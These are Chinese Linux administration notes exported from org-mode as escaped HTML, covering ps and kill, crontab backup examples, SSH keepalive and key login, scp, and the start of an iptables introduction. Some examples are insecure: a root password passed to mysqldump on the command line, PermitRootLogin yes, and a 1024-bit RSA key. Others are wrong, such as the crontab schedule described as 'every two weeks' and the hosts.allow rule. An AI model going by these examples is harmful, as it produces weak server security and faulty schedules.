&lt;h3 id=&quot;orgcee1364&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.4&lt;/span&gt; Linux System Resource&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-4&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb813422&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgb813422&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.4.1&lt;/span&gt; 进程管理&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-4-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;常见进程管理命令
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;top&lt;/li&gt;
&lt;li id=&quot;ps&quot;&gt;&lt;p&gt;
	       list the processes running on the system
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 查看
$ ps -ef

&lt;/pre&gt;&lt;/li&gt;
&lt;li id=&quot;kill &amp;amp; killall&quot;&gt;send a signal to one or more processes (usually to &quot;kill&quot; a process)&lt;/li&gt;
&lt;li id=&quot;jobs&quot;&gt;an alternate way of listing your own processes&lt;/li&gt;
&lt;li id=&quot;bg&quot;&gt;put a process in the background&lt;/li&gt;
&lt;li id=&quot;fg&quot;&gt;put a process in the forground&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org281083d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org281083d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.4.2&lt;/span&gt; 系统资源监控&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf578ca7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf578ca7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.4.3&lt;/span&gt; 例行性工作排程：系统定时任务&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-4-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
对于 Linux 用户
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
你肯定希望：
     每一天早上 8:00 钟，让电脑连接上音响，并播放音乐来唤你起床；
     而中午 12:00 希望 Linux 可以发一封信到你的邮件信箱，提醒你可以去吃午餐了；
     另外，在每年你爱人生日的前一天，先发封信提醒你，以免忘记这么重要的一天。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;crontab 简单介绍 
crontab 命令的功能是在一定的时间间隔调度一些命令的执行。
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
/etc/crontab 文件
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
在 /etc 目录下有一个 crontab 文件，这里存放有系统运行的一些调度程序。每个用户可以建立自己的调度 crontab(在 /var/spool/cron 目录下)。

cron 服务每分钟不仅要读一次 /var/spool/cron 内的所有文件，还需要读一次 /etc/crontab，因此我们配置这个文件也能运用 cron 服务做一些事情。

用 crontab 配置是针对某个用户的，而编辑 /etc/crontab 是针对系统的任务。


&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
crontab 文件格式如下：
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org8327c2e&quot;&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;SHELL&lt;/span&gt;=/bin/bash
&lt;span style=&quot;color: #FF8C00;&quot;&gt;PATH&lt;/span&gt;=/sbin:/bin:/usr/sbin:/usr/bin
&lt;span style=&quot;color: #FF8C00;&quot;&gt;MAILTO&lt;/span&gt;=root       &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#22914;&amp;#26524;&amp;#20986;&amp;#29616;&amp;#38169;&amp;#35823;&amp;#65292;&amp;#25110;&amp;#32773;&amp;#26377;&amp;#25968;&amp;#25454;&amp;#36755;&amp;#20986;&amp;#65292;&amp;#25968;&amp;#25454;&amp;#20316;&amp;#20026;&amp;#37038;&amp;#20214;&amp;#21457;&amp;#32473;&amp;#36825;&amp;#20010;&amp;#24080;&amp;#21495;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;HOME&lt;/span&gt;=/            &lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#20351;&amp;#29992;&amp;#32773;&amp;#36816;&amp;#34892;&amp;#30340;&amp;#36335;&amp;#24452;,&amp;#36825;&amp;#37324;&amp;#26159;&amp;#26681;&amp;#30446;&amp;#24405;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;run-parts&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
注意到&quot;run-parts&quot;这个参数，后面可以写要运行的某个脚本。

另外：
/usr/lib/cron/cron.allow 表示谁能使用 crontab 命令。如果它是一个空文件表明没有一个用户能安排作业。如果这个文件不存在，而有另外一个文件。
/usr/lib/cron/cron.deny,则只有不包括在这个文件中的用户才可以使用 crontab 命令。如果它是一个空文件表明任何用户都可安排作业。两个文件同时存在时，cron.allow 优先，如果都不存在，只有超级用户可以安排作业。

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
crontab 基本格式
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 29:&lt;/span&gt; 格式&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;\&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;*&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;*&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;*&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;*&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;*&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;commond&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;代表意思&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;分&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;时&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;日&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;月&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;周&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;范    围&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;(0-59)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;(0-23)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;(1-31)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;(1-12)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;(0-6)&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;pre class=&quot;example&quot;&gt;
“ * ”表示任意时刻
“ , ”表示分割
“ - ”表示一个段
“ /n ”表示每 n 的单位执行一次

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
命令后面加上 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1  ,标准错误重定向到标准输出

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
实例1：实现两个周备份一次 /var/ftp 目录下的内容
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
具体实现方法如下:
   a.先新建一个 txt 文件，这里是 ftp-back-shell.txt，文件内容：

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgcb97ba1&quot;&gt;* * 14 * * cd /back/ftp-back/ &amp;amp;&amp;amp; rsync -avzc /var/ftp ./
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
b.将 ftp-back.txt 文件放到 /opt/ftp-back/ 目录下 

c.运行：
     $ crontab /opt/ftp-back/ftp-back.txt
     $ crontab -l

d.需要进行重启，配置文件生效： sudo systemctl restart crond.service

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;实例2：实现定时插入数据
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
新建 crontab.sh 脚本文件
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim crontab.sh

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;sh&lt;/span&gt;
/usr/bin/php /home/zrg/.crontab/crontab.php
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;编辑 php 文件&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设置定时任务
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ crontab -e

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;*/2 * * * * /bin/bash /home/zrg/.crontab/crontab.sh
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
查看定时任务
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ crontab -l
重启服务使生效：sudo systemctl restart cron.service

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
移除定时服务
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ crontab -r

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
示例3：备份 mysql 数据
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim cron.sh

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;sh&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;filename&lt;/span&gt;=&lt;span style=&quot;color: #AF87FF; font-weight: bold;&quot;&gt;`date +%Y%m%d%H%M%S`&lt;/span&gt;
mysqldump -u root -proot testdb&amp;gt;/home/zrg/crontab/$&lt;span style=&quot;color: #FF8C00;&quot;&gt;filename&lt;/span&gt;.sql
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
$ crontab -e
0 2 * * *  /bin/bash /home/zrg/crontab/cron.sh
$rccron reload

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
一些简单示例
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
43 21 * * * 21:43 执行
0 17 * * 1 每周一的 17:00 执行
0,10 17 * * 0,2,3 每周日,周二,周三的 17:00和 17:10 执行
0-10 17 1 * * 毎月1日从 17:00到17:10 毎隔1分钟 执行
*/10 * * * * 　　　　　　 每隔10分 执行
0,10,20,30,40,50 * * * *　每隔10分 执行
2 8-20/3 * * *　　　　　　8:02,11:02,14:02,17:02,20:02 执行

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org286e9a4&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org286e9a4&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.4.4&lt;/span&gt; 远程管理：SSH、VNC&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-4-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;SSH &amp;amp; OpenSSH &amp;amp; SSL &amp;amp; OpenSSL
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;SSL(Secure Sockets Layer)，是网络通信提供安全及数据完整性的一种安全协议，它涉及所有TC/IP应用程序。SSL协议使用通讯双方的客户证书以及CA根证书，允许客户/服务器应用以一种不能被偷听的方式通讯，在通讯双方间建立起了一条安全的、可信任的通讯通道。它具备以下基本特征：信息保密性、信息完整性、相互鉴定。 主要用于提高应用程序之间数据的安全系数。&lt;/li&gt;
&lt;li&gt;OpenSSL，对SSL的实现。&lt;/li&gt;
&lt;li&gt;SSH(Secure Shell)，意为“安全外壳协议”，是一种可以为远程登录提供安全保障的协议。使用SSH，可以把所有传输的数据进行加密，“中间人”攻击方式就不可能实现，能防止DNS欺骗和IP欺骗。&lt;/li&gt;
&lt;li&gt;OpenSSH，对SSH的实现。依赖于OpenSSL，没有OpenSSL的话OpenSSH就编译不过去，也运行不了。&lt;/li&gt;
&lt;li&gt;HTTPS(Hypertext Transfer Protocol Secure，超文本传输安全协议)，是一种透过计算器网上进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;ssh 配置
&lt;b&gt;配置持久连接&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
服务端
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/ssh/sshd_config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orge5a9f9d&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;server&amp;#27599;&amp;#38548;60&amp;#31186;&amp;#21457;&amp;#36865;&amp;#19968;&amp;#27425;&amp;#35831;&amp;#27714;&amp;#32473;client&amp;#65292;&amp;#28982;&amp;#21518;client&amp;#21709;&amp;#24212;&amp;#65292;&amp;#20174;&amp;#32780;&amp;#20445;&amp;#25345;&amp;#36830;&amp;#25509;&lt;/span&gt;
ClientAliveInterval 60  
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;server&amp;#21457;&amp;#20986;&amp;#35831;&amp;#27714;&amp;#21518;&amp;#65292;&amp;#23458;&amp;#25143;&amp;#31471;&amp;#27809;&amp;#26377;&amp;#21709;&amp;#24212;&amp;#24471;&amp;#27425;&amp;#25968;&amp;#36798;&amp;#21040;3&amp;#65292;&amp;#23601;&amp;#33258;&amp;#21160;&amp;#26029;&amp;#24320;&amp;#36830;&amp;#25509;&amp;#65292;&amp;#27491;&amp;#24120;&amp;#24773;&amp;#20917;&amp;#19979;&amp;#65292;client&amp;#19981;&amp;#20250;&amp;#19981;&amp;#21709;&amp;#24212;&amp;#12290;&lt;/span&gt;
ClientAliveCountMax 3
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
客户端
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/ssh/ssh_config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgf1cd1e9&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;server&amp;#27599;&amp;#38548;60&amp;#31186;&amp;#21457;&amp;#36865;&amp;#19968;&amp;#27425;&amp;#35831;&amp;#27714;&amp;#32473;client&amp;#65292;&amp;#28982;&amp;#21518;client&amp;#21709;&amp;#24212;&amp;#65292;&amp;#20174;&amp;#32780;&amp;#20445;&amp;#25345;&amp;#36830;&amp;#25509;&lt;/span&gt;
ServerAliveInterval 60  
&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;server&amp;#21457;&amp;#20986;&amp;#35831;&amp;#27714;&amp;#21518;&amp;#65292;&amp;#23458;&amp;#25143;&amp;#31471;&amp;#27809;&amp;#26377;&amp;#21709;&amp;#24212;&amp;#24471;&amp;#27425;&amp;#25968;&amp;#36798;&amp;#21040;3&amp;#65292;&amp;#23601;&amp;#33258;&amp;#21160;&amp;#26029;&amp;#24320;&amp;#36830;&amp;#25509;&amp;#65292;&amp;#27491;&amp;#24120;&amp;#24773;&amp;#20917;&amp;#19979;&amp;#65292;client&amp;#19981;&amp;#20250;&amp;#19981;&amp;#21709;&amp;#24212;&amp;#12290;&lt;/span&gt;
ServerAliveCountMax 3
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
使用OpenSSL生成密钥对
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
生成私钥
$ openssl genrsa -out rsa_private_key.pem 1024
参数:genrsa 生成密钥   -out 输出到文件  rsa_private_key.pem 文件名  1024 长度

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
从私钥中提取公钥
$ openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem
参数: rsa 提取公钥  -in 从文件中读入  rsa_private_key.pem 文件名   -pubout  输出   -out 到文件  rsa_public_key.pem  文件名

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;修改ssh默认端口号
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
首先修改配置文件：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /etc/ssh/sshd_config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgcb9100f&quot;&gt;Port 22 Port 6666   
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
注意：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;这里添加6666端口，测试成功连接后，再去除22端口配置。这样可以避免修改不成功无法正常登录。&lt;/li&gt;
&lt;li&gt;所修改的端口需要事先查明未被其他服务占用，以免造成不可估计的后果！&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
重启ssh和防火墙
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ systemctl restart iptables
$ systemctl restart sshd

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
假如要限制SSH登陆的IP，那么可以如下做：
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
首先：修改/etc/hosts.deny，在其中加入sshd:ALL
然后：修改：/etc/hosts.allow，在其中进行如下设置：sshd:192.168.1.1：deny  （192.168.1.*）
这样就可以限制只有192.168.1.1的IP通过SSH登陆上LINUX机器了。

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;通过密钥登录服务器
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
生成密钥对
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ssh-keygen

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org7aa7fd7&quot;&gt;Generating public/private rsa key pair.
Enter file in which to save the key (/home/zrg/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/zrg/.ssh/id_rsa.
Your public key has been saved in /home/zrg/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:OEEJVicOORWU5awcPz7oYPtldQwQXdwuPFyUcVY0umU zrg@DESKTOP-5IIDIKQ
The key's randomart image is:
+---[RSA 2048]----+
|    +*B==o o.oo=*|
|   .o+o= .. . =o.|
|     .+ o .o + E |
|     . *   o= =  |
|      = S . o+   |
|       + o .     |
|    o . =        |
|   . + o .       |
|    ..o          |
+----[SHA256]-----+
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
在服务器上配置上公钥
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; authorized_keys
$ chmod 600 ~/.ssh/authorized_keys
$ chmod 700 ~/.ssh

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
配置ssh，打开密钥登录功能
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /etc/ssh/sshd_config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;orgf3c5fba&quot;&gt;RSAAuthentication yes
PubkeyAuthentication yes
PermitRootLogin yes //root &amp;#29992;&amp;#25143;&amp;#33021;&amp;#21542;&amp;#36890;&amp;#36807; SSH &amp;#30331;&amp;#24405;
PasswordAuthentication no //&amp;#24403;&amp;#23436;&amp;#25104;&amp;#20840;&amp;#37096;&amp;#35774;&amp;#32622;&amp;#65292;&amp;#20197;&amp;#23494;&amp;#38053;&amp;#26041;&amp;#24335;&amp;#30331;&amp;#24405;&amp;#25104;&amp;#21151;&amp;#21518;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#31105;&amp;#29992;&amp;#23494;&amp;#30721;&amp;#30331;&amp;#24405;&amp;#65306;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
重启ssh服务
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ systemctl restart sshd.service

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;使用scp上传或下载文件
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
从服务器上下载文件
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scp username@servername:/path/filename /var/www/local_dir（本地目录）
示例：scp root@192.168.0.101:/var/www/test.txt  把 192.168.0.101 上的 /var/www/test.txt 的文件下载到 /var/www/local_dir（本地目录）

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
上传本地文件到服务器
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scp /path/filename username@servername:/path   
例如 scp /var/www/test.php  root@192.168.0.101:/var/www/  把本机 /var/www/ 目录下的 test.php 文件上传到 192.168.0.101 这台服务器上的 /var/www/ 目录中

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
从服务器下载整个目录
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scp -r username@servername:/var/www/remote_dir/（远程目录） /var/www/local_dir（本地目录）
例如：scp -r root@192.168.0.101:/var/www/test  /var/www/  

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
上传目录到服务器
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scp  -r local_dir username@servername:remote_dir
例如：scp -r test  root@192.168.0.101:/var/www/ 把当前目录下的test目录上传到服务器的 /var/www/ 目录

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org27867dd&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org27867dd&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.4.5&lt;/span&gt; 防火墙：iptables &amp;amp; firewalld 工具&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-4-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;防火墙管理工具
&lt;br /&gt;
众所周知，企业内网和外部公网相比，外部的公网环境更加恶劣，罪恶丛生。在公网与企业内网之间充当保护屏障的防火墙（见下图所示）虽然有软件或硬件之分，但主要功能都是依据策略对穿越防火墙自身的流量进行过滤。防火墙策略可以基于流量的源地址、端口号、协议、应用等信息来定制，然后防火墙使用预先定制的策略规则监控出入的流量，若流量与某一条策略规则相匹配，则执行相应的处理，反之则丢弃。这样一来，就可以保证仅有合法的流量在企业内网和外部公网之间流动了。
&lt;br /&gt;
目前在RHEL 7系统中，firewalld防火墙取代了iptables防火墙。其实，iptables与firewalld都不是真正的防火墙，它们都只是用来定义防火墙策略的防火墙管理工具而已，或者说，它们只是一种服务。与 Linux 内核集成的 IP 信息包过滤系统。防火墙在做数据包过滤决定时，有一套遵循和组成的规则，这些规则存储在专用的数据包过滤表中，而这些表集成在 Linux 内核中。
&lt;br /&gt;
iptables服务会把配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而firewalld服务则是把配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。换句话说，当前在Linux系统中其实存在多个防火墙管理工具，旨在方便运维人员管理Linux系统中的防火墙策略，我们只需要配置妥当其中的一个就足够了。虽然这些工具各有优劣，但它们在防火墙策略的配置思路上是保持一致的。
&lt;br /&gt;
netfilter 组件也称为内核空间（kernelspace），是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。
&lt;br /&gt;
iptables 组件是一种工具，也称为用户空间（userspace），它使插入、修改和除去信息包过滤表中的规则变得容易。&lt;/li&gt;
&lt;li&gt;iptables
&lt;br /&gt;
在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
策略与规则链
&lt;br /&gt;
防火墙会从上至下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作并去执行匹配项中定义的行为（即放行或阻止）。如果在读取完所有的策略规则之后没有匹配项，就去执行默认的策略。防火墙策略规则的设置有两种：一种是“通”（即放行），一种是“堵”（即阻止iptables服务把用于处理或过滤流量的策略条目称之为规则，多条规则可以组成一个规则链，而规则链则依据数据包处理位置的不同进行分类，具体如下：
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;在进行路由选择前处理数据包（PREROUTING）；&lt;/li&gt;
&lt;li&gt;处理流入的数据包（INPUT）；&lt;/li&gt;
&lt;li&gt;处理流出的数据包（OUTPUT）；&lt;/li&gt;
&lt;li&gt;处理转发的数据包（FORWARD）；&lt;/li&gt;
&lt;li&gt;在进行路由选择后处理数据包（POSTROUTING）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
&lt;br /&gt;
一般来说，从内网向外网发送的流量一般都是可控且良性的，因此我们使用最多的就是INPUT规则链，该规则链可以增大黑客人员从外网入侵内网的难度。
&lt;br /&gt;
iptables 服务的术语:ACCEPT（允许流量通过）、REJECT（拒绝流量通过，拒绝流量后再回复一条&quot;您的信息已经收到，但是被扔掉了&quot;）、LOG（记录日志信息）、DROP（拒绝流量通过，直接将流量丢弃不响应）。当把Linux系统中的防火墙策略设置为REJECT拒绝动作后，流量发送方会看到端口不可达的响应：把Linux系统中的防火墙策略修改成DROP拒绝动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;基本的命令参数
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
规则功能说明
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 30:&lt;/span&gt; 表&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;filter&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;主要和主机自身有关，主要负责防火墙功能 过滤本机流入流出的数据包是默认使用的表&lt;/td&gt;
&lt;/tr&gt;
